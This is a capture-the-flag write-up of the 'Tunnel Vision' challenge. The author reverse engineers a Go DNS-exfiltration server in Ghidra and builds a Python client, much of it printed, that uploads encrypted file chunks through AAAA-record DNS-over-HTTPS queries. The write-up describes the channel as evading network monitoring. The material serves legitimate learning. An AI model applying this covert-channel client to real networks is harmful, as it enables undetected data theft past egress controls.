---
layout: writeup
title: "O5: Tunnel Vision - DNS Exfiltration Protocol Reverse Engineering"
date: 2025-09-15
category: "COMPETITION"
tags: ["reverse-engineering", "ghidra", "dns", "cryptography", "blue-team"]
permalink: /writeups/tunnel-vision-o5/
---

![Tunnel Vision Challenge](/assets/images/tunnel-vision-banner.png)

# 2025 Target Cyber Defense Challenge: When All Exits Are Blocked, Go Underground

**Target Corporation x Women in Cybersecurity (WiCyS)**

**🏆 2nd Place Overall 🏆**

## O5: Tunnel Vision

*Reverse engineering a DNS exfiltration binary when every other escape route has been cut off*

---

While the competition had multiple challenges, I'm writing about O5: Tunnel Vision because of its complexity and my learning journey. Starting with zero reverse engineering experience, I had to quickly learn Ghidra and static binary analysis.

The solution took two weeks of dedicated focus - analyzing ARM64 assembly and writing Python scripts to test protocol theories. When scripts threw errors (often), I used AI help to debug and keep moving. I spent an entire week just trying to decrypt the server's cryptic error messages before I could use them as feedback to improve my client.

I went from fumbling through assembly code to confidently rebuilding a complete cryptographic protocol. I wanted to document this journey for others starting from the same place.

---

## The Setup: Last Resort Protocols

*"You've tried every exit. Proxies clamped shut. Egress rules got strict. The SOC started tracing anything that looks even a little suspicious."*

This was O5: Tunnel Vision, a 500-point CTF challenge that put us in the shoes of an operator whose usual exfiltration methods had been blocked. With network monitoring tightened and suspicious traffic being traced, we needed to fall back to more subtle techniques.

A friend throws us a lifeline: an old service binary from a previous DNS exfiltration job. No documentation. No source code. No memory of the handshake protocol. Just a black-box binary and the knowledge that somewhere inside its compiled assembly lies a working covert channel.

**The Mission**:

* Reverse engineer the unknown protocol from the binary alone
* Build a client that can speak the wire protocol correctly
* Successfully upload a file through the DNS covert channel
* Extract the flag from the server's response

**The Resources**:

* **Target endpoint**: `https://target-exfil.chals.io`
* **Exfiltration domain**: `xfl.tn`
* **Upload file**: Provided binary file that must be transmitted
* **Server binary**: ARM64 Go executable with no source or documentation

The server binary was ARM64 Go 1.25 (released just a week before the competition), making local debugging seemingly impossible for most competitors, unless they had a compatible Mac. Since I own 0 Apple products, everything had to be done through static analysis in Ghidra - no dynamic analysis, no local testing, just assembly analysis and testing guesses against the live server.

The organizers eventually released an x86_64 version to help other competitors run the binary on a local server, but this solution was developed entirely through static analysis of the ARM64 binary.

**Main Challenge Components:**

* Go binary server (ARM64 architecture)
* DNS-over-HTTPS covert channel using AAAA records
* NaCl (Network and Cryptography library) encryption
* Base32 hex encoding for DNS-safe transmission
* Multi-chunk file upload protocol

## Initial Analysis with Ghidra

### What We Found: Main Function Structure

The first breakthrough came from analyzing the strings in the binary. Using Ghidra's string search turned up several important clues:
```
// From exfil analysis
"exfil/dns.go"
"processChunk0"
"processChunkN" 
"handleUploadRequest"
"github.com/miekg/dns"
"encoding/base32"
```

These strings immediately told us we were dealing with:

* A DNS-based system (using the popular `miekg/dns` Go library)
* Chunk-based data transfer
* Base32 encoding for DNS compatibility

### Function Analysis: The Core Protocol Handlers

#### 1. `main.(*DNSHandler).processChunk0`

Located at address `10021f840`, this function handles the initial chunk (chunk 0) of the upload process. Important observations from the Ghidra decompilation:
```
// From main.processChunk0
void main.(*DNSHandler).processChunk0(main.DNSHandler *this, ...)
{
    // ... stack setup ...
    
    // Key crypto operations visible:
    bl main.DecryptWithSharedKey  // Decrypt incoming data
    
    // Process the decrypted chunk
    bl main.(*DNSHandler).processChunk0 
    
    // Respond based on processing result
    bl main.(*DNSHandler).respondWithSuccess
}
```

The function clearly shows a decrypt-process-respond pattern.

#### 2. `main.(*DNSHandler).processChunkN`

Located at address `10021fbb0`, this handles subsequent chunks (N > 0). From the analysis in `main.processChunkN`:
```
void main.(*DNSHandler).processChunkN(main.DNSHandler *this, ...)
{
    // ... setup code ...
    
    // Decision logic based on chunk processing
    if (condition) {
        main.(*DNSHandler).respondWithFinished(this,param_2,param_3);
    }
    else {
        main.(*DNSHandler).respondWithSuccess(this,param_2,iVar13,param_3);
    }
}
```

This revealed the protocol's completion mechanism - the server sends a "finished" response when all chunks are received.

### Cryptographic Implementation Findings

#### NaCl Secretbox Usage

The binary analysis showed extensive use of NaCl cryptographic functions:
```
// From secretbox.Open and secretbox.Seal
bl golang.org/x/crypto/nacl/secretbox.Seal
bl golang.org/x/crypto/nacl/secretbox.Open
```

This told us the system uses:

* **NaCl secretbox**: Authenticated encryption (XChaCha20Poly1305)
* **Elliptic Curve Diffie-Hellman**: For key exchange (Curve25519)
* **Shared secret derivation**: Using `crypto_box_beforenm`

#### Base32 Hex Encoding

From the strings analysis, we found the system uses Base32 hex encoding (not standard Base32):
```
// Evidence from exfil
"encoding/base32"
"isValidBase32"
```

This encoding ensures DNS-safe transmission in domain names.

### Protocol Reconstruction

#### DNS Message Structure

The `frameAsAAAARecords` function revealed how data is embedded in DNS responses:
```
// From frameasaaaarecords
void main.(*DNSHandler).frameAsAAAARecords(...)
{
    // Creates AAAA (IPv6) records to carry encrypted payload
    // Each record carries 15 bytes of data (16-byte IPv6 minus 1-byte index)
}
```

**Explanation**: Data is split across multiple AAAA records, with the first byte of each IPv6 address serving as a record index.

#### Handshake Protocol

Through reverse engineering, we discovered the protocol flow:

1. **HELLO Exchange**: Client sends public key, server responds with its public key and session info
2. **META Exchange**: Client sends file metadata (size, chunk count, Blake3 hash)
3. **CHUNK Upload**: Client uploads file chunks sequentially
4. **FINISHED Response**: Server indicates completion and returns the flag

## Deconstructing the Protocol

Understanding how each phase of the protocol worked required careful analysis of data formats, DNS message construction, and cryptographic operations. Here's the complete technical breakdown:

### Phase 1: HELLO Exchange - Elliptic Curve Key Exchange

The HELLO phase establishes the cryptographic session through ECDH key exchange.

**Client Request Construction:**

This code sets up the initial cryptographic handshake by generating an ephemeral key pair and embedding the public key in a DNS query:
```python
# Generate ephemeral key pair
cli = PrivateKey.generate()
client_private_key = bytes(cli)  # 32 bytes
client_public_key = bytes(cli.public_key)  # 32 bytes

# Construct DNS query with embedded public key
def build_hello_query(public_key: bytes, zone: str) -> str:
    # Base32 hex encode the 32-byte public key
    pk_encoded = base64.b32hexencode(public_key).decode().rstrip("=").lower()
    # Result: 52 characters (32 * 8 / 5 = 51.2, rounded up)
    return f"{pk_encoded}.xfl.tn"  # Using actual CTF domain
```

**Explanation**: We generate a Curve25519 key pair for ECDH key exchange. The 32-byte public key gets Base32-hex encoded (not standard Base32) into a 52-character string that becomes the subdomain in our DNS query. This allows us to send our public key to the server disguised as a normal DNS lookup.

**DNS Wire Format Construction:**

This builds a properly formatted DNS query packet that will be sent over DNS-over-HTTPS:
```python
def build_query(domain: str) -> bytes:
    """Build proper DNS query packet for AAAA record lookup"""
    header = struct.pack(">HHHHHH", 
                        0,      # Transaction ID
                        0x0100, # Flags: standard query, recursion desired
                        1,      # Questions: 1
                        0,      # Answer RRs: 0  
                        0,      # Authority RRs: 0
                        0)      # Additional RRs: 0
    
    qname = qname_wire(domain)  # DNS name encoding with length prefixes
    qtype_qclass = struct.pack(">HH", 28, 1)  # Type AAAA (28), Class IN (1)
    
    return header + qname + qtype_qclass
```

**Explanation**: DNS has a specific binary format that must be followed exactly. The header contains counters for different record types, flags indicating this is a standard query, and a transaction ID. We're specifically asking for AAAA records (IPv6 addresses, type 28) which the server uses to send back our encrypted data. The `qname_wire()` function converts "xfl.tn" into the DNS wire format with length prefixes.

**Server Response Analysis:**

The server embeds encrypted data across multiple AAAA records. This code extracts and organizes that data:
```python
def parse_aaaa_by_id(dns_response: bytes) -> dict:
    """Extract indexed AAAA records from DNS response"""
    recs = {}
    # Parse DNS header, skip questions section
    # Extract answer section AAAA records
    for record in answer_section:
        if record.type == 28 and len(record.rdata) == 16:  # AAAA record
            record_id = record.rdata[0]  # First byte is record index
            recs[record_id] = record.rdata  # Store full 16-byte IPv6 address
    return recs

# Server response structure:
# Record 0: [0x00][length_bytes_1-15]    - Total encrypted payload length
# Record 1-6: [0x01-0x06][data_bytes]    - Encrypted handshake data (15 bytes each)
```

**Explanation**: The server disguises its encrypted response as legitimate IPv6 addresses (AAAA records). Each record carries 16 bytes, with the first byte serving as an index (0-6) and the remaining 15 bytes carrying actual data. Record 0 contains metadata (total payload length), while records 1-6 contain the encrypted handshake response. This is how the server sends ~90 bytes of encrypted data back to us while looking like a normal DNS response.

**Decryption and Session Establishment:**

Once we get the server's response, we need to decrypt it and extract the session parameters:
```python
def process_hello_response(records: dict) -> dict:
    # Reconstruct server's encrypted response
    if set(records.keys()) != set(range(7)):
        raise ValueError("Missing AAAA records in server response")
    
    # Get total length from record 0
    length_bytes = records[0][1:5]  # Bytes 1-4 of record 0
    total_length = struct.unpack(">I", length_bytes)[0]
    
    # Reconstruct encrypted payload from records 1-6 (90 bytes total)
    encrypted_payload = b"".join(records[i][1:] for i in range(1, 7))
    
    # Extract components
    server_public_key = encrypted_payload[:32]    # 32 bytes
    nonce = encrypted_payload[32:56]              # 24 bytes  
    ciphertext = encrypted_payload[56:56+total_length]  # Remaining bytes
    
    # Derive shared secret using ECDH
    shared_secret = crypto_box_beforenm(server_public_key, client_private_key)
    
    # Decrypt server's session info
    plaintext = SecretBox(shared_secret).decrypt(ciphertext, nonce)
    
    # Extract session parameters
    op7 = plaintext[:7]        # 7-byte operation code
    session_id = plaintext[7:11]  # 4-byte session ID
    
    return {
        "shared": shared_secret,
        "op7": op7,
        "session_id": session_id
    }
```

**Explanation**: This is the heart of the cryptographic handshake. We first validate that we received all 7 expected AAAA records from the server. Then we reconstruct the server's message by concatenating the data from records 1-6 (skipping the index bytes). The server's message contains its public key, a nonce, and encrypted session data. We use ECDH to compute a shared secret from the server's public key and our private key, then use NaCl SecretBox to decrypt the session info. The decrypted data gives us an operation code (`op7`) and session ID that we'll need for all future communications.

### Technical Reference: HELLO Response Structure

The server's response spans 7 AAAA records with this layout:

| Record | Byte 0 | Bytes 1-15 | Content |
| --- | --- | --- | --- |
| 0 | 0x00 | Length data | Total payload length (4 bytes) |
| 1-6 | 0x01-06 | Payload data | 15 bytes each of response data |

**Combined payload structure:**

| Bytes | Content | Size |
| --- | --- | --- |
| 0-31 | Server Public Key | 32 bytes |
| 32-55 | Nonce | 24 bytes |
| 56+ | Encrypted Box | Variable (session ID + TTL) |

### Ghidra Analysis: Session Establishment

From `main.(*DNSHandler).handleHelloMessage`, key cryptographic calls:

* `box.GenerateKey()` - Server creates ephemeral keypair
* `box.Precompute()` - Computes shared secret with client public key
* `secretbox.Seal()` - Encrypts 11-byte session payload (7-byte session ID + 4-byte TTL)

### Phase 2: META Exchange - File Metadata Upload

The META phase sends file information to initialize the upload session.

**Metadata Payload Construction:**

For the META phase, we need to tell the server about the file we're going to upload:
```python
def build_meta_payload(file_path: str, num_chunks: int) -> bytes:
    """Build file metadata payload"""
    # Calculate file hash using Blake3
    import blake3
    hasher = blake3.blake3()
    file_size = os.path.getsize(file_path)
    
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(1<<20), b""):  # 1MB chunks for hashing
            hasher.update(chunk)
    
    file_hash = hasher.digest()[:32]  # 32-byte Blake3 hash
    
    # Pack metadata: size(4) + num_chunks(4) + hash(32) + padding(24) = 64 bytes
    metadata = struct.pack(">II", file_size, num_chunks) + file_hash + b"\x00" * 24
    
    return metadata  # Total: 64 bytes before encryption
```

**Explanation**: The server needs to know what file we're uploading before we start sending chunks. We create a metadata packet containing the file size (4 bytes), number of chunks (4 bytes), and a Blake3 cryptographic hash of the entire file (32 bytes). The server will use this hash to verify the file integrity after all chunks are received. We pad to exactly 64 bytes because that's what the server expects, then this gets encrypted before transmission.

### Technical Reference: Metadata Structure (Sequence ID 0)

The first chunk sent must have sequence ID 0 and contains file metadata:

| Field | Size | Description |
| --- | --- | --- |
| File Size | 4 bytes BE | Total size of file in bytes |
| Chunk Count | 4 bytes BE | Number of data chunks (ceiling div) |
| BLAKE3 Hash | 32 bytes | Cryptographic hash of entire file |
| Padding | 24 bytes | Zero padding to reach 64 bytes |

This metadata validation happens only once - the server doesn't re-verify the hash after receiving all chunks.

**META Query Construction:**

After building the metadata, we need to encrypt it and format it for DNS transmission:
```python
def send_meta_request(session: dict, metadata: bytes, zone: str) -> str:
    # Construct nonce for META request (sequence ID = 0)
    meta_nonce = session["op7"] + b"\x00" * (24 - 7 - 4) + (0).to_bytes(4, "big")
    
    # Encrypt metadata payload
    sealed = SecretBox(session["shared"]).encrypt(metadata, meta_nonce).ciphertext
    # sealed is now 80 bytes (64 bytes metadata + 16 bytes Poly1305 tag)
    
    # Base32 hex encode for DNS transmission
    sealed_b32 = base64.b32hexencode(sealed).decode().rstrip("=").lower()
    # Result: 128 characters (80 * 8 / 5 = 128)
    
    # Split into 4 labels of 56 chars max, pad with 'z'
    labels = [sealed_b32[i:i+56] for i in range(0, len(sealed_b32), 56)]
    labels = [label for label in labels if label]  # Remove empty labels
    while len(labels) < 4:
        labels.append("z")  # Pad to 4 labels
    
    # Construct complete META query
    query_parts = labels + [
        "00000000",                    # Sequence ID: 0 for META
        session["op7"].decode(),       # 7-byte operation code
        "xfl", "tn"                   # Actual CTF DNS zone
    ]
    
    return ".".join(query_parts)
```

**Explanation**: This demonstrates how we package encrypted data for DNS transmission. First, we encrypt the 64-byte metadata with a nonce that includes the session's `op7` code and sequence ID 0 (META is always sequence 0). NaCl SecretBox adds a 16-byte authentication tag, giving us 80 bytes total. We Base32-hex encode this to 128 characters, then split it into DNS labels. Each DNS label can be max 63 characters, but we use 56 to be safe. The server expects exactly 4 labels, so we pad with 'z' characters. Finally, we build the complete DNS query by combining data labels + sequence ID + operation code + the actual CTF zone "xfl.tn".

### Technical Reference: Upload Query Structure

Upload queries follow the format: `L0.L1.L2.L3.SEQID.SESSIONID.xfl.tn`

| Component | Format | Description |
| --- | --- | --- |
| L0-L3 | Base32-hex | Up to 4 labels, 56 chars max each |
| SEQID | 8-digit hex | Sequence ID (00000000 for META, 00000001+) |
| SESSIONID | 7-char | Session identifier from handshake |
| Domain | xfl.tn | Challenge DNS zone |

**Label Processing Rules:**

* Full labels: Exactly 56 characters
* Partial labels: Less than 56 characters (triggers padding mode)
* Padding: All labels after partial must be single 'z' character
* Base32 alphabet: `0123456789abcdefghijklmnopqrstuv` (lowercase hex variant)

### Ghidra Analysis: Upload Processing

From `main.(*DNSHandler).parseUploadRequest` at address `0x100220690`:

* Single Base32 decode operation at `0x1002208ec`
* 4-label processing loop with 'z' padding detection
* Label concatenation before decoding (not per-label decoding)

From `main.(*DNSHandler).handleUploadRequest` at address `0x10021f6b8`:

* Nonce construction: session ID copied to bytes 0-6
* Sequence ID byte-swapped but stored at wrong location (`sp+0x58` not nonce buffer)
* DecryptWithSharedKey called with full 80-byte buffer (the bug)

### Phase 3: CHUNK Upload - File Data Transmission

Each chunk uploads exactly 124 bytes of file data (0x7c bytes).

**Chunk Size Calculation Logic:**

The server has very specific expectations about chunk sizes that we discovered from assembly analysis:
```python
def calculate_chunk_size(chunk_index: int, file_size: int) -> int:
    """Calculate expected chunk size (server's logic)"""
    CHUNK_SIZE = 124  # 0x7c bytes per chunk
    
    offset = (chunk_index - 1) * CHUNK_SIZE  # Chunks are 1-indexed
    
    if offset >= file_size:
        return 0  # Beyond end of file
    
    remaining = file_size - offset
    return min(CHUNK_SIZE, remaining)
```

**Explanation**: From our Ghidra analysis, we found that the server expects exactly 124 bytes (0x7c) per chunk, with chunks numbered starting from 1. For a 32KB file, this means 264 full chunks of 124 bytes each, plus one final chunk of 32 bytes. The server performs strict validation - it will reject chunks that are the wrong size or contain wrong data. This function replicates the server's own chunk size calculation logic.

### Technical Reference: Chunk Size Calculation

From the decompiled code in `main.LoadExpectedFile`, the server uses these constants:

* **Plaintext chunk size**: 124 bytes (0x7c)
* **Total chunks formula**: `ceil(fileSize / 124)` = `(fileSize + 123) / 124`

The compiler optimizes this as `(fileSize + 0x7b) / 0x7c` where 0x7b is 123, explaining the constant we see in assembly.

**Chunk Upload Implementation:**

This shows the complete process of uploading a single file chunk to the server:
```python
def upload_chunk(session: dict, chunk_index: int, file_path: str, zone: str):
    """Upload a single file chunk"""
    CHUNK_SIZE = 124
    
    # Read chunk data from file
    offset = (chunk_index - 1) * CHUNK_SIZE
    with open(file_path, "rb") as f:
        f.seek(offset)
        chunk_data = f.read(CHUNK_SIZE)
    
    # Construct nonce with sequence ID
    chunk_nonce = make_nonce(session["op7"], chunk_index)
    
    # Encrypt chunk data
    sealed = SecretBox(session["shared"]).encrypt(chunk_data, chunk_nonce).ciphertext
    # sealed = chunk_data + 16-byte Poly1305 tag = up to 140 bytes
    
    # Base32 hex encode
    sealed_b32 = base64.b32hexencode(sealed).decode().rstrip("=").lower()
    
    # Create DNS labels (up to 4 labels of 56 chars each)
    labels = create_dns_labels(sealed_b32)
    
    # Construct query with hex-encoded sequence ID
    query_parts = labels + [
        f"{chunk_index:08x}",         # 8-digit hex sequence ID
        session["op7"].decode(),      # Operation code
        "xfl", "tn"                  # Actual CTF DNS zone
    ]
    
    query = ".".join(query_parts)
    response = send_doh_query(query)
    
    return parse_chunk_response(response)
```

**Explanation**: This is the core of the file upload process. For each chunk (1-265 for a 32KB file), we read exactly the right number of bytes from the file, construct a unique nonce using the chunk index as a sequence ID, encrypt the chunk with our shared secret, and encode it for DNS. Each chunk gets its own DNS query with a unique hex sequence ID (00000001, 00000002, etc.). The server uses this sequence ID to know which chunk we're sending and to reconstruct the file in the correct order.

**DNS Label Construction with Padding:**

This function handles the specific way the server expects DNS labels to be formatted:
```python
def create_dns_labels(data_b32: str) -> list:
    """Split Base32 data into DNS-safe labels"""
    # Split into 56-character chunks (DNS label size limit)
    labels = []
    for i in range(0, len(data_b32), 56):
        label = data_b32[i:i+56]
        if label:
            labels.append(label)
    
    # Pad to exactly 4 labels with 'z'
    while len(labels) < 4:
        labels.append("z")
    
    if len(labels) > 4:
        raise ValueError(f"Too many labels: {len(labels)}")
    
    return labels
```

**Explanation**: DNS has strict limits on label lengths (63 characters max), and the server expects exactly 4 labels per query. We discovered from reverse engineering that the server uses 56 characters as the practical limit to avoid edge cases. When our Base32-encoded data doesn't fill all 4 labels, we pad with 'z' characters - the server specifically looks for 'z' as a padding marker and stops processing when it sees them. This function ensures our data is always formatted exactly as the server expects.

### Phase 4: FINISHED Response - Flag Recovery

The final phase handles server completion responses.

**Response Parsing Logic:**
```python
def parse_server_response(dns_response: bytes) -> tuple:
    """Parse server response from AAAA records"""
    records = parse_aaaa_by_id(dns_response)
    
    if 0 not in records:
        raise ValueError("Missing header record (ID 0)")
    
    # Extract response metadata from record 0
    header = records[0]
    response_length = struct.unpack(">I", header[1:5])[0]
    
    # Reconstruct response body from remaining records
    data_records = sorted(k for k in records.keys() if k != 0)
    response_body = b"".join(records[i][1:] for i in data_records)[:response_length]
    
    return response_body

def handle_server_reply(response_body: bytes) -> dict:
    """Process server response (plaintext due to server bug)"""
    if len(response_body) == 0:
        return {"status": "empty"}
    
    marker = response_body[0]
    
    if marker == 0x00:  # Success response
        if len(response_body) >= 5:
            remaining = struct.unpack(">I", response_body[1:5])[0]
            return {"status": "success", "remaining": remaining}
    
    elif marker == 0x01:  # Finished response  
        if len(response_body) >= 5:
            flag_data = response_body[5:]  # Skip marker + 4 padding bytes
            flag_text = flag_data.decode('utf-8', 'ignore')
            return {"status": "finished", "flag": flag_text}
    
    return {"status": "unknown", "data": response_body.hex()}
```

### Critical Implementation Details

**DNS Message Compliance:**

DNS has a specific wire format that must be followed exactly for proper parsing:
```python
def qname_wire(domain: str) -> bytes:
    """Encode domain name in DNS wire format"""
    result = b""
    for label in domain.strip(".").split("."):
        if not label or len(label) > 63:
            raise ValueError(f"Invalid label length: {len(label)}")
        result += bytes([len(label)]) + label.encode('ascii')
    return result + b"\x00"  # Null terminator
```

**Explanation**: DNS doesn't just use plain text domain names - it has a special wire format where each label (part between dots) is prefixed with its length. For example, "xfl.tn" becomes `\x03xfl\x02tn\x00` - that's 3 bytes for "xfl", then "xfl", then 2 bytes for "tn", then "tn", then a null terminator. This function converts our constructed domains (like "abcd1234.efgh5678.z.z.00000001.opcode.xfl.tn") into this wire format so the DNS server can parse it correctly.

**DoH (DNS-over-HTTPS) Transport:**

This function sends our crafted DNS queries to the server via encrypted HTTPS:
```python
def send_doh_query(domain: str, doh_endpoint: str) -> bytes:
    """Send DNS query via HTTPS"""
    dns_query = build_query(domain)
    
    response = requests.post(
        doh_endpoint,
        data=dns_query,
        headers={
            "Content-Type": "application/dns-message",
            "Accept": "application/dns-message"
        },
        timeout=20
    )
    
    response.raise_for_status()
    return response.content
```

**Explanation**: Instead of sending DNS queries over UDP port 53 (traditional DNS), this challenge uses DNS-over-HTTPS (DoH) on port 443. This makes the DNS traffic look like normal HTTPS web traffic, helping it blend in and avoid detection. We take our binary DNS query packet and POST it to the DoH endpoint at `https://target-exfil.chals.io/dns-query` with the correct Content-Type header. The server responds with a binary DNS response packet that contains our encrypted data disguised as AAAA records. DoH is a real protocol (RFC 8484) used by browsers like Firefox and Chrome for privacy, but here it's being used as a covert channel.

This detailed protocol implementation shows how each phase built upon the previous discoveries, requiring precise data formatting, cryptographic operations, and DNS protocol compliance to successfully communicate with the server despite its implementation bugs.

### DNS-over-HTTPS Communication
```python
def doh(msg: bytes) -> bytes:
    """Send DNS query via HTTPS"""
    r = requests.post(DOH, data=msg, 
                     headers={"Content-Type": "application/dns-message"}, 
                     timeout=20)
    r.raise_for_status()
    return r.content

def build_query(domain: str) -> bytes:
    """Build DNS query packet for AAAA record"""
    return struct.pack(">HHHHHH", 0, 0x0100, 1, 0, 0, 0) + \
           qname_wire(domain) + struct.pack(">HH", 28, 1)  # Type AAAA
```

### Nonce Construction

A biggest find was the nonce format (this took an entire week):
```python
def make_nonce(op7: bytes, seqid: int) -> bytes:
    """Construct 24-byte nonce: op7 + 13 zeros + 4-byte sequence ID"""
    return op7 + b"\x00" * (24 - 7 - 4) + seqid.to_bytes(4, "big")
```

The 7-byte operation code (`op7`) from the handshake is crucial for nonce generation.

### Technical Reference: Nonce Construction

From analyzing `handleUploadRequest`, nonces are built as follows:

| Bytes | Content | Description |
| --- | --- | --- |
| 0-6 | Session ID | 7-byte ASCII session identifier |
| 7-19 | Zero pad | 13 null bytes |
| 20-23 | Sequence ID | 4-byte big-endian chunk sequence number |

**Critical Server Bug**: The server's nonce construction is broken - the sequence ID gets byte-swapped but stored at the wrong memory location, never making it into the actual nonce buffer. This means server nonces are `[session_id][17_zeros]` instead of the expected format.

### Chunk Upload Process
```python
def send_chunk_once(session, chunk_index, filesize):
    """Upload a single file chunk"""
    # Read chunk from file
    offset = (chunk_index - 1) * CHUNK_SIZE
    with open(FILE, "rb") as f:
        f.seek(offset)
        plaintext = f.read(min(CHUNK_SIZE, filesize - offset))
    
    # Encrypt with NaCl secretbox
    sb = SecretBox(session["shared"])
    encrypted = sb.encrypt(plaintext, make_nonce(session["op7"], chunk_index)).ciphertext
    
    # Encode as Base32 hex and create DNS query
    labels = base32_hex_labels(encrypted)
    domain = ".".join(labels + [f"{chunk_index:08x}", session["op7"].decode(), *ZONE.split(".")])
    
    # Send via DoH and parse response
    response = doh(build_query(domain))
    return parse_response(response)
```

## The Final Working Solution

Our complete client successfully:

1. Did ECDH key exchange via HELLO message
2. Sent file metadata via META message
3. Uploaded all 265 chunks of the target file
4. Got the flag in the completion response

What made this work:

* **Base32 hex encoding** (not standard Base32)
* **Proper nonce construction** using op7 + sequence ID
* **Chunk deferred completion** - server may signal finished early, but client must continue until all chunks sent
* **DoH message format** compliance
* **AAAA record parsing** with proper index handling

## Lessons Learned

1. **String analysis is gold**: The embedded file paths and function names provided the initial roadmap
2. **Crypto library identification**: Recognizing NaCl patterns was crucial
3. **Protocol flow matters**: Understanding the state machine prevented many dead ends
4. **Encoding details matter**: Base32 vs Base32 hex made the difference between working and broken
5. **Network protocols have structure**: DNS message format compliance was essential

This challenge demonstrated the importance of systematic reverse engineering, combining static analysis with protocol understanding, and careful attention to cryptographic implementation details.

## Final Thoughts

This challenge was a good example of real-world reverse engineering work - analyzing a complex binary, understanding its network protocols, and building a compatible client. The use of real cryptographic libraries (NaCl) and standard protocols (DNS-over-HTTPS) made it both realistic and challenging.

For others tackling similar challenges:

* Start with string analysis to get the big picture
* Use Ghidra's cross-references to trace data flow
* Don't ignore the small details - encoding choices matter
* Build incrementally - get the handshake working before tackling file transfer
* Test against the actual target frequently
* Use AI to help guide your searches or to help refine your scripts when you hit a wall

The complete working client script shows that with patience and careful analysis, even complex protocols can be reverse engineered and rebuilt.
